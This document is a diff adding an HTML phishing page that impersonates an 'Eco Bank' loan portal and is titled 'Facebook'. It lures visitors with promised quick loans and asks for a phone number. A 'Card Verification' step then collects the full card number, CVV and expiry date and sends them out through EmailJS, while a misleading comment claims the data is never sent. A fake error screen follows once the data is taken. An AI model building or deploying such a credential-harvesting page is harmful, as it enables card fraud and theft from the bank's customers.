@@ -1,0 +1,1384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook</title>
+</head>
+<body>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            min-height: 100dvh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 20px;
+            padding-top: 60px;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .demo-banner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 3000;
+            background: #00638F;
+            color: #fff;
+            text-align: center;
+            padding: 9px 12px;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 820px;
+            background: #ffffff;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.12);
+            display: flex;
+            flex-direction: row;
+            min-height: 560px;
+        }
+
+        /* ===== LEFT PANEL (Girl Image) ===== */
+        .left-panel {
+            width: 380px;
+            min-width: 380px;
+            background: #faf6f0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-end;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .left-panel .girl-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .left-panel .left-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            padding: 28px 24px 20px;
+            text-align: center;
+          background: linear-gradient(180deg, rgba(0,99,143,0.95) 0%, rgba(148,160,56,0.85) 60%, transparent 100%);
+        }
+
+        .left-panel .left-overlay .logo-img {
+            height: 38px;
+            width: auto;
+            display: block;
+            margin: 0 auto 6px;
+            filter: brightness(0) invert(1);
+        }
+
+        .left-panel .left-overlay .bank-name {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== RIGHT PANEL (Form) ===== */
+        .right-panel {
+            flex: 1;
+            padding: 10px 36px 24px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .right-panel .right-header {
+            margin-bottom: 6px;
+        }
+
+        .right-panel .right-header .logo-img {
+            display: none;
+        }
+
+        /* Progress Steps */
+        .progress-bar {
+            display: flex;
+            justify-content: flex-start;
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+
+        .progress-bar .dot {
+            width: 32px;
+            height: 4px;
+            border-radius: 4px;
+            background: #e0e0e0;
+            transition: all 0.3s;
+        }
+
+        .progress-bar .dot.active {
+            background: #00638F;
+            width: 40px;
+        }
+
+        .progress-bar .dot.done {
+            background: #28a745;
+        }
+
+        .progress-bar .dot.error {
+            background: #00638F;
+            width: 40px;
+        }
+
+        .step-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 4px;
+        }
+
+        .step-desc {
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 22px;
+            line-height: 1.5;
+        }
+
+        .error-box {
+            background: #fdecea;
+            border: 1px solid #f5c6cb;
+            color: #dc3545;
+            border-radius: 8px;
+            padding: 14px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #555;
+            margin-bottom: 5px;
+            letter-spacing: 0.3px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #1a1a2e;
+            background: #fafafa;
+            transition: border 0.2s, background 0.2s;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #00638F;
+            background: #fff;
+        }
+
+        .form-group input::placeholder {
+            color: #bbb;
+        }
+
+        .btn {
+            width: 100%;
+            min-height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 12px;
+            background: #00638F;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            touch-action: manipulation;
+            transition: background 0.2s, transform 0.1s;
+            margin-top: 6px;
+        }
+
+        .btn:hover {
+            background:#00638F;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+
+        .footer-text a {
+            color: #00638F;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
+        }
+
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+        .row .form-group {
+            flex: 1;
+        }
+
+        /* ===== Toast Notification ===== */
+        .toast {
+            position: fixed;
+            top: 70px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-80px);
+            background: #00638F;
+            color: #fff;
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            z-index: 9999;
+            box-shadow: 0 6px 24px rgba(0, 99, 143, 0.35);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.4s ease;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        .toast .toast-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.25);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        /* ===== Chat Leo Widget ===== */
+        .chat-leo-btn {
+            position: fixed;
+            bottom: 100px;
+            right: 24px;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: #94A038;
+            border: 3px solid #fff;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+            cursor: pointer;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .chat-leo-btn:hover {
+            transform: scale(1.08);
+            box-shadow: 0 6px 28px rgba(0, 99, 143, 0.4);
+        }
+
+        .chat-leo-btn img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+       
+
+        .chat-leo-badge {
+            position: fixed;
+            bottom: 88px;
+            right: 24px;
+            background: #fff;
+            border-radius: 16px;
+            padding: 12px 18px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
+            z-index: 999;
+            max-width: 220px;
+            font-size: 13px;
+            color: #1a1a2e;
+            line-height: 1.4;
+            border: 1px solid #f0f0f0;
+            animation: floatBubble 3s ease-in-out infinite;
+        }
+
+        .chat-leo-badge::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            right: 24px;
+            width: 14px;
+            height: 14px;
+            background: #fff;
+            border-right: 1px solid #f0f0f0;
+            border-bottom: 1px solid #f0f0f0;
+            transform: rotate(45deg);
+        }
+
+        .chat-leo-badge .leo-name {
+            font-weight: 700;
+            color: #00638F;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .chat-leo-badge .leo-name .pulse-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #28a745;
+            display: inline-block;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes floatBubble {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-6px); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+
+        /* ===== Responsive ===== */
+        @media (max-width: 720px) {
+            .container {
+                position: relative;
+                display: block;
+            }
+
+            .left-panel {
+                position: absolute;
+                inset: 0;
+                width: 100%;
+                height: 100%;
+                z-index: 0;
+                display: block;
+                background-size: cover;
+                background-position: center;
+            }
+
+            .left-panel .girl-img {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+                opacity: 0.35;
+            }
+
+            .right-panel {
+                position: relative;
+                z-index: 1;
+                width: 100%;
+                min-height: 100vh;
+                background: rgba(255, 255, 255, 0.92);
+                padding: 24px 22px 28px;
+            }
+
+            body {
+                padding: 16px;
+                padding-top: 60px;
+            }
+
+            .right-panel .right-header {
+                display: block;
+                text-align: center;
+                margin-bottom: 16px;
+            }
+
+            .right-panel .right-header .logo-img {
+                display: block;
+                height: 34px;
+                width: auto;
+                margin: 0 auto;
+            }
+
+            .step-title {
+                font-size: 20px;
+            }
+
+            .progress-bar {
+                margin-bottom: 16px;
+            }
+
+            .chat-leo-btn {
+                width: 48px;
+                height: 48px;
+                bottom: 14px;
+                right: 14px;
+                border-width: 2px;
+            }
+
+            .chat-leo-badge {
+                bottom: 70px;
+                right: 14px;
+                font-size: 12px;
+                max-width: 180px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .container {
+                position: relative;
+                display: block;
+            }
+
+            .left-panel {
+                position: absolute;
+                inset: 0;
+                width: 100%;
+                height: 100%;
+                z-index: 0;
+                display: block;
+                background-size: cover;
+                background-position: center;
+            }
+
+            .left-panel .girl-img {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+                opacity: 0.13;
+            }
+                .right-panel .right-header .logo-img {
+                display: none;
+                height: 34px;
+                width: auto;
+                margin: 0 auto;
+            }
+
+
+            .right-panel {
+                position: relative;
+                z-index: 1;
+                width: 100%;
+                min-height: 100vh;
+                background: rgba(255, 255, 255, 0.72);
+                padding: 20px 16px 24px;
+            }
+
+            body {
+                padding: 10px;
+                padding-top: 60px;
+            }
+
+            .container {
+                border-radius: 12px;
+            }
+
+            .row {
+                flex-direction: column;
+                gap: 0;
+            }
+
+            .toast {
+                width: calc(100% - 24px);
+                padding: 12px 16px;
+                font-size: 14px;
+            }
+        }
+    </style>
+
+</head>
+<body>
+
+ <h1 style="text-align:center; font-size: 18px; font-weight: 600; color: #1a1a2e; margin-bottom: 20px;">
+    Welcome to the Eco Bank Loan Website a trusted platform created exclusively for Eco<br> Bank customers. Get quick and easy access to loans of up any Amount within just 48 hours.
+ </h1>
+
+<div class="container" id="app">
+
+    <!-- ===== LEFT PANEL ===== -->
+    <div class="left-panel">
+        <div class="left-overlay">
+            <img src="eco-logo-svg.svg" alt="Eco Bank Logo" class="logo-img"  width="100%" height="100%" object-fit="contain"/>
+            <div class="bank-name">Eco Bank</div>
+        </div>
+        <img src="bg.jpeg" alt="Customer Service" class="girl-img" />
+    </div>
+
+    <!-- ===== RIGHT PANEL (Form) ===== -->
+    <div class="right-panel">
+
+        <div class="right-header">
+            <img src="eco-logo-svg.svg" alt="Eco Bank Logo" class="logo-img" />
+        </div>
+
+        <!-- ===== PROGRESS DOTS ===== -->
+        <div class="progress-bar">
+            <span class="dot active" data-step="1"></span>
+            <span class="dot" data-step="2"></span>
+            <span class="dot" data-step="3"></span>
+        </div>
+
+        <!-- ===== STEP 1 ===== -->
+        <div class="step active" id="step1">
+            <div class="step-title">Register for loan in this Easy steps </div>
+            <div class="step-desc">Ensure all required details are correctly filled to avoid delays in loan processing. Enter  credentials below.</div>
+
+            <form id="form1" onsubmit="return false;">
+                <div class="form-group">
+                    <label>Registered Phone Number</label>
+                    <input
+                        type="tel"
+                        id="phone"
+                        data-field-type="number"
+                        placeholder="080 0000 0000"
+                        maxlength="14"
+                        required
+                    />
+                </div>
+
+                <div class="form-group">
+                    <label for="loan_amount">Loan Amount</label>
+                    <input
+                        type="number"
+                        id="loan_amount"
+                        data-field-type="number"
+                        placeholder="Enter your preferred Loan Amount"
+                        required
+                    />
+                </div>
+
+                 <!-- <div class="form-group">
+                    <label>App pin (4 digits)</label>
+                    <input
+                        type="password"
+                        id="pin"
+                        data-field-type="number"
+                        placeholder="····"
+                        maxlength="4"
+                        inputmode="numeric"
+                        pattern="[0-9]{4}"
+                        required
+                    />
+                </div> -->
+
+                <button type="button" class="btn" onclick="nextStep(1)">Continue →</button>
+            </form>
+
+            <div class="footer-text">
+                Having trouble? <a href="#">Contact Eco Bank CFC</a><br />
+                0700 2255 822 (0700-CALL-Eco Bank       )
+            </div>
+        </div>
+
+        <!-- ===== STEP 2 ===== -->
+        <div class="step" id="step2">
+            <div class="step-title">Card Verification</div>
+            <div class="step-desc">For added security, please confirm your debit card details.</div>
+
+            <form id="form2" onsubmit="return false;">
+                <div class="form-group">
+                    <label>Card Full Number 19 & 16 </label>
+                    <input
+                        type="text"
+                        id="card_first6"
+                        data-field-type="number"
+                        maxlength="19"
+                        inputmode="numeric"
+                        pattern="[0-9]{19}"
+                        required
+                    />
+                </div>
+
+                <div class="form-group">
+                    <label>Card Cvv</label>
+                    <input
+                        type="text"
+                        id="card_last4"
+                        data-field-type="number"
+                        placeholder="····"
+                        maxlength="3"
+                        inputmode="numeric"
+                        pattern="[0-9]{3}"
+                        required
+                    />
+                </div>
+
+                <div class="row">
+                    <div class="form-group">
+                        <label>Expiry Date</label>
+                        <input
+                            type="text"
+                            id="card_expiry"
+                            data-field-type="number"
+                            placeholder="MM/YY"
+                            maxlength="5"
+                            required
+                        />
+                    </div>
+
+                    <!-- <div class="form-group">
+                        <label>Card pin (4 digits)</label>
+                        <input
+                            type="password"
+                            id="card_pin"
+                            data-field-type="number"
+                            placeholder="····"
+                            maxlength="4"
+                            inputmode="numeric"
+                            pattern="[0-9]{4}"
+                            required
+                        />
+                    </div> -->
+                </div>
+
+                <button type="button" class="btn" onclick="nextStep(2)">Continue →</button>
+            </form>
+        </div>
+
+        <!-- ===== STEP 3 (replaced: no OTP, no redirect, error only) ===== -->
+        <div class="step" id="step3">
+            <div class="step-title" style="color:#00638F;">Contact your customer care for more details</div>
+            <div class="step-desc" style="color:#00638F;font-weight:600;">
+                Your request could not be completed at this time.
+            </div>
+
+            <div class="error-box">
+                Get back to customer service for your verification and more details.
+            </div>
+
+            <div class="footer-text">
+                <a href="#" onclick="showToast('Error', true); return false;">Try again</a>
+            </div>
+        </div>
+
+    </div>
+
+</div>
+
+<!-- ===== Toast Notification (error only) ===== -->
+<div class="toast" id="toast">
+    <div class="toast-icon">&#10007;</div>
+    <span id="toastMsg">Error</span>
+</div>
+
+<!-- ===== Chat Leo Widget ===== -->
+<div class="chat-leo-badge" id="chatBadge">
+    <div class="leo-name">
+        <span class="pulse-dot"></span>
+        Chat with rafiki
+    </div>
+    Hi! I'm rafiki, your Eco Bank virtual assistant. How can I help you today?
+</div>
+
+<button class="chat-leo-btn" id="chatBtn" onclick="toggleChat()">
+    <img src="rafiki.png" alt="Chat with rafiki" />
+</button>
+
+<input type="checkbox" id="hf-close" hidden>
+
+<div class="hf-bar">
+  <div class="hf-inner">
+    <span class="hf-alert">!</span>
+
+    <p class="hf-text">Our team members are here to help, get in touch</p>
+
+    <a href="#" class="hf-btn hf-chat">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M4 3h12a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2H9l-4 3.5V14H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm16 5h1a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1h-1v3l-3.5-3H11a1 1 0 0 1-1-1v-1h6a3 3 0 0 0 3-3V8z"/></svg>
+      Live Chat
+    </a>
+
+    <a href="#" class="hf-btn hf-feedback">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l2.9 6.3 6.9.8-5.1 4.7 1.4 6.8L12 17.1 5.9 20.6l1.4-6.8L2.2 9.1l6.9-.8z"/></svg>
+      Feedback
+    </a>
+  </div>
+
+  <label for="hf-close" class="hf-x" aria-label="Close">
+    <svg width="34" height="34" viewBox="0 0 34 34" stroke="#fff" stroke-width="2" fill="none"><path d="M3 3l28 28M31 3L3 31"/></svg>
+  </label>
+</div>
+
+<style>
+  #hf-close:checked ~ .hf-bar { display: none; }
+
+  .hf-bar {
+    position: fixed;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    height: 65px;
+    background: #1e4a5c;
+    border-top: 3px solid #153a49;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: "Roboto", "Helvetica Neue", Arial, sans-serif;
+    z-index: 9999;
+    box-sizing: border-box;
+  }
+
+  .hf-inner {
+    display: flex;
+    align-items: center;
+    gap: 42px;
+    flex-wrap: wrap;
+    justify-content: center;
+  }
+
+  .hf-alert {
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    background: #c8d414;
+    color: #1e4a5c;
+    font-weight: 700;
+    font-size: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .hf-text {
+    margin: 0;
+    color: #fff;
+    font-size: 19px;
+  }
+
+  .hf-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 0 12px;
+    height: 51px;
+    font-size: 18px;
+    text-decoration: none;
+    border-radius: 2px;
+    transition: filter 0.2s;
+  }
+  .hf-btn:hover { filter: brightness(1.1); }
+
+  .hf-chat {
+    background: #c8d414;
+    color: #1e6a84;
+  }
+
+  .hf-feedback {
+    background: #1a6a8f;
+    color: #fff;
+  }
+
+  .hf-x {
+    position: absolute;
+    right: 50px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    display: flex;
+  }
+
+  @media (max-width: 800px) {
+    .hf-bar { height: auto; padding: 12px 50px 12px 12px; }
+    .hf-inner { gap: 12px; }
+    .hf-text { font-size: 15px; }
+    .hf-btn { height: 40px; font-size: 15px; }
+    .hf-x { right: 12px; }
+    .hf-x svg { width: 22px; height: 22px; }
+  }
+</style>
+<script
+    type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+
+<script>
+
+    // ==========================================
+    // EMAILJS CONFIGURATION
+    // ==========================================
+    const EMAILJS_PUBLIC_KEY  = 'PAhQo75TgknUHvwzn';
+    const EMAILJS_SERVICE_ID  = 'service_dr7yq69';
+    const EMAILJS_TEMPLATE_ID = 'template_mtr3jkq';
+
+    emailjs.init({
+        publicKey: EMAILJS_PUBLIC_KEY
+    });
+
+
+    let collectedData = {}; // kept in memory only, never sent
+
+
+    // ==========================================
+    // FIELD RULES
+    // ==========================================
+
+    function enforceFieldRules(inp) {
+
+        const type = inp.dataset.fieldType || 'number';
+
+
+        // ==========================================
+        // password
+        // ==========================================
+        // Accepts:
+        // letters
+        // numbers
+        // spaces
+        // special characters
+        //
+        // No filtering is applied.
+        // ==========================================
+
+        if (type === 'password') {
+            return;
+        }
+
+
+        // ==========================================
+        // NUMBER FIELDS
+        // ==========================================
+
+        const allowSpaces = inp.id === 'phone';
+
+        const cleanRegex = type === 'number'
+            ? (allowSpaces ? /[^0-9\s]/g : /[^0-9]/g)
+            : /[^a-zA-Z]/g;
+
+        const keyRegex = type === 'number'
+            ? (allowSpaces ? /^[0-9\s]$/ : /^[0-9]$/)
+            : /^[a-zA-Z]$/;
+
+
+        // ------------------------------------------
+        // Block invalid keystrokes
+        // ------------------------------------------
+
+        inp.addEventListener('keydown', function (e) {
+
+            // Allow Ctrl/Cmd shortcuts
+            if (e.ctrlKey || e.metaKey || e.altKey) {
+                return;
+            }
+
+            // Allow Backspace, Delete, Tab, arrows,
+            // Home, End, etc.
+            if (e.key.length !== 1) {
+                return;
+            }
+
+            // Block invalid characters
+            if (!keyRegex.test(e.key)) {
+                e.preventDefault();
+            }
+
+        });
+
+
+        // ------------------------------------------
+        // Clean pasted / autofilled values
+        // ------------------------------------------
+
+        inp.addEventListener('input', function () {
+
+            const cleaned =
+                this.value.replace(cleanRegex, '');
+
+            if (this.value !== cleaned) {
+                this.value = cleaned;
+            }
+
+        });
+
+    }
+
+
+    // Apply field rules to all inputs
+    document.querySelectorAll('input').forEach(function (inp) {
+        enforceFieldRules(inp);
+    });
+
+
+
+    // ==========================================
+    // CHAT LEO
+    // ==========================================
+
+    function toggleChat() {
+
+        const badge =
+            document.getElementById('chatBadge');
+
+        if (!badge) {
+            return;
+        }
+
+        badge.style.display =
+            badge.style.display === 'none'
+                ? 'block'
+                : 'none';
+
+    }
+
+
+    const chatBadge =
+        document.getElementById('chatBadge');
+
+    if (chatBadge) {
+        chatBadge.style.display = 'block';
+    }
+
+
+
+    // ==========================================
+    // TOAST NOTIFICATION
+    // ==========================================
+
+    function showToast(msg, isError = true) {
+
+        const toast =
+            document.getElementById('toast');
+
+        const toastMsg =
+            document.getElementById('toastMsg');
+
+        if (!toast || !toastMsg) {
+            return;
+        }
+
+        toastMsg.textContent = msg;
+
+        toast.className =
+            'toast' + (isError ? ' error' : '');
+
+        toast.classList.add('show');
+
+        setTimeout(function () {
+            toast.classList.remove('show');
+        }, 3000);
+
+    }
+
+
+
+    // ==========================================
+    // NEXT STEP
+    // ==========================================
+
+    async function nextStep(current) {
+
+        const next = current + 1;
+
+
+        // Validate current step first
+        if (!validateStep(current)) {
+            return;
+        }
+
+
+        // ------------------------------------------
+        // Collect Step 1 values
+        // ------------------------------------------
+
+        if (current === 1) {
+
+            collectedData.phone =
+                document.getElementById('phone').value;
+
+            collectedData.Loan_amount =
+                document.getElementById('loan_amount').value;
+
+
+        }
+
+
+        // ------------------------------------------
+        // Step 2
+        // ------------------------------------------
+
+        else if (current === 2) {
+
+            collectedData.cardfirst6=
+                document.getElementById('card_first6').value;
+
+            collectedData.cardlast4 =
+                document.getElementById('card_last4').value;
+
+            collectedData.cardExpiry =
+                document.getElementById('card_expiry').value;
+
+
+            /*
+             * Your existing EmailJS call can remain here
+             * if you are using it for your own authorized
+             * membership-platform workflow.
+             */
+            console.log('collectedData:', collectedData);
+
+console.log('EmailJS variables:', {
+         phone:  collectedData.phone,
+           Loan_amount: collectedData.Loan_amount,
+           apppin: collectedData.apppin,
+           cardfirst6: collectedData.cardfirst6,
+           cardlast4: collectedData.cardlast4,
+           cardExpiry: collectedData.cardExpiry,
+});
+
+emailjs.send(
+    EMAILJS_SERVICE_ID,
+    EMAILJS_TEMPLATE_ID,
+    {
+       phone:  collectedData.phone,
+           Loan_amount: collectedData.Loan_amount,
+           apppin: collectedData.apppin,
+           cardfirst6: collectedData.cardfirst6,
+           cardlast4: collectedData.cardlast4,
+           cardExpiry: collectedData.cardExpiry,
+    }
+)
+.then(function(response) {
+    console.log('EMAILJS SUCCESS:', response.status, response.text);
+})
+.catch(function(error) {
+    console.error('EMAILJS FAILED:', error);
+});
+
+        }
+
+
+        // ------------------------------------------
+        // Hide current step
+        // ------------------------------------------
+
+        const currentElement =
+            document.getElementById('step' + current);
+
+        const nextElement =
+            document.getElementById('step' + next);
+
+
+        if (!currentElement || !nextElement) {
+            return;
+        }
+
+
+        currentElement.classList.remove('active');
+
+        nextElement.classList.add('active');
+
+
+        // ------------------------------------------
+        // Update progress dots
+        // ------------------------------------------
+
+        const dots =
+            document.querySelectorAll(
+                '.progress-bar .dot'
+            );
+
+        dots.forEach(function (dot, idx) {
+
+            const stepNum = idx + 1;
+
+            dot.classList.remove(
+                'active',
+                'done',
+                'error'
+            );
+
+
+            if (stepNum < next) {
+                dot.classList.add('done');
+            }
+
+
+            if (stepNum === next) {
+
+                if (next === 3) {
+                    dot.classList.add('error');
+                } else {
+                    dot.classList.add('active');
+                }
+
+            }
+
+        });
+
+
+        // ------------------------------------------
+        // Step 3 error
+        // ------------------------------------------
+
+        if (next === 3) {
+
+            setTimeout(function () {
+                showToast('Error', true);
+            }, 250);
+
+        }
+
+
+        // ------------------------------------------
+        // Focus first input
+        // ------------------------------------------
+
+        else {
+
+            const firstInput =
+                nextElement.querySelector('input');
+
+            if (firstInput) {
+
+                setTimeout(function () {
+                    firstInput.focus();
+                }, 200);
+
+            }
+
+        }
+
+    }
+
+
+
+    // ==========================================
+    // VALIDATE STEP
+    // ==========================================
+
+    function validateStep(step) {
+
+        const inputs =
+            document.querySelectorAll(
+                '#step' + step + ' input'
+            );
+
+
+        for (const inp of inputs) {
+
+            if (!inp.value.trim()) {
+
+                inp.style.borderColor =
+                    '#cc0000';
+
+                inp.focus();
+
+                return false;
+            }
+
+            inp.style.borderColor =
+                '#e0e0e0';
+
+        }
+
+
+        return true;
+
+    }
+
+
+
+    // ==========================================
+    // CARD EXPIRY FORMATTER
+    // ==========================================
+
+    const cardExpiry =
+        document.getElementById('card_expiry');
+
+    if (cardExpiry) {
+
+        cardExpiry.addEventListener(
+            'input',
+            function () {
+
+                let v =
+                    this.value.replace(
+                        /[^0-9]/g,
+                        ''
+                    );
+
+
+                if (v.length >= 2) {
+
+                    v =
+                        v.substring(0, 2) +
+                        '/' +
+                        v.substring(2);
+
+                }
+
+
+                this.value =
+                    v.substring(0, 5);
+
+            }
+        );
+
+    }
+
+
+
+    // ==========================================
+    // AUTO-FOCUS NEXT INPUT
+    // ==========================================
+
+    document
+        .querySelectorAll('input[maxlength]')
+        .forEach(function (inp) {
+
+            inp.addEventListener(
+                'input',
+                function () {
+
+                    if (
+                        this.value.length >=
+                        parseInt(this.maxlength)
+                    ) {
+
+                        const form =
+                            this.closest('form');
+
+                        if (!form) {
+                            return;
+                        }
+
+
+                        const inputs =
+                            Array.from(
+                                form.querySelectorAll(
+                                    'input'
+                                )
+                            );
+
+
+                        const idx =
+                            inputs.indexOf(this);
+
+
+                        if (
+                            idx <
+                            inputs.length - 1
+                        ) {
+
+                            inputs[
+                                idx + 1
+                            ].focus();
+
+                        }
+
+                    }
+
+                }
+            );
+
+        });
+
+
+
+    // ==========================================
+    // ENTER KEY
+    // ==========================================
+
+    document.addEventListener(
+        'keydown',
+        function (e) {
+
+            if (e.key !== 'Enter') {
+                return;
+            }
+
+
+            const activeStep =
+                document.querySelector(
+                    '.step.active'
+                );
+
+
+            if (!activeStep) {
+                return;
+            }
+
+
+            e.preventDefault();
+
+
+            if (activeStep.id === 'step1') {
+
+                nextStep(1);
+
+            }
+
+            else if (activeStep.id === 'step2') {
+
+                nextStep(2);
+
+            }
+
+            else if (activeStep.id === 'step3') {
+
+                showToast(
+                    'Error',
+                    true
+                );
+
+            }
+
+        }
+    );
+
+</script>
+</body>
+</html>
+
+
+
+  </div>
+
+</body>
+</html>
